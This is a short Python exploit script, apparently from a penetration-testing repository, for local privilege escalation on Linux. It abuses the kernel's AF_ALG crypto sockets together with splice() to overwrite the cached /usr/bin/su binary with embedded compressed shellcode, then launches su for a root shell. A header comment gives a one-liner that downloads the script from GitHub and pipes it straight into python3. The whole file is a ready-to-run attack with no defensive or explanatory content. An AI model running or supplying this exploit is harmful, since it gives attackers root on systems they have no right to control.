#!/usr/bin/env -S PYTHONDONTWRITEBYTECODE=1 python3

# Ejecución remota:
#   curl -sL https://raw.githubusercontent.com/nipegun/pt-scripts/refs/heads/main/3-Elevate/CopyFail.py | python3

import os as g
import zlib
import socket as s

cAF_ALG = 38
cSOCK_SEQPACKET = 5
cSOL_ALG = 279
cALG_SET_KEY = 1
cALG_SET_IV = 2
cALG_SET_OP = 3
cALG_SET_AEAD_ASSOCLEN = 4
cALG_SET_AEAD_AUTHSIZE = 5
cALG_OP_DECRYPT = 0
cAUTHSIZE = 4

cAlgoritmo = "aead"
cModo = "authencesn(hmac(sha256),cbc(aes))"

cArchivoObjetivo = "/usr/bin/su"

cClaveHex = "0800010000000010" + ("0" * 64)
cDatosComprimidosHex = "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"

def fHexABytes(pHex):
  return bytes.fromhex(pHex)

def fDescifrarBloque(pArchivo, pOffset, pBloqueCifrado):
  vSocketAlgoritmo = s.socket(cAF_ALG, cSOCK_SEQPACKET, 0)
  vSocketAlgoritmo.bind((cAlgoritmo, cModo))

  vSocketAlgoritmo.setsockopt(cSOL_ALG, cALG_SET_KEY, fHexABytes(cClaveHex))
  vSocketAlgoritmo.setsockopt(cSOL_ALG, cALG_SET_AEAD_AUTHSIZE, None, cAUTHSIZE)

  vSocketOperacion, _ = vSocketAlgoritmo.accept()

  vLongitudOffset = pOffset + cAUTHSIZE

  vIvCero = fHexABytes("00")
  vTipoOperacion = vIvCero * 4
  vIv = b"\x10" + (vIvCero * 19)

  vSocketOperacion.sendmsg(
    [b"A" * cAUTHSIZE + pBloqueCifrado],
    [
      (cSOL_ALG, cALG_SET_OP, vTipoOperacion),
      (cSOL_ALG, cALG_SET_IV, vIv),
      (cSOL_ALG, cALG_SET_AEAD_ASSOCLEN, b"\x08" + (vIvCero * 3)),
    ],
    32768
  )

  vLecturaPipe, vEscrituraPipe = g.pipe()

  g.splice(pArchivo, vEscrituraPipe, vLongitudOffset, offset_src=0)
  g.splice(vLecturaPipe, vSocketOperacion.fileno(), vLongitudOffset)

  try:
    vSocketOperacion.recv(8 + pOffset)
  except:
    0

vArchivoObjetivo = g.open(cArchivoObjetivo, 0)

vShellcode = zlib.decompress(fHexABytes(cDatosComprimidosHex))

vIndice = 0
while vIndice < len(vShellcode):
  fDescifrarBloque(vArchivoObjetivo, vIndice, vShellcode[vIndice:(vIndice + 4)])
  vIndice += 4

g.system("su")
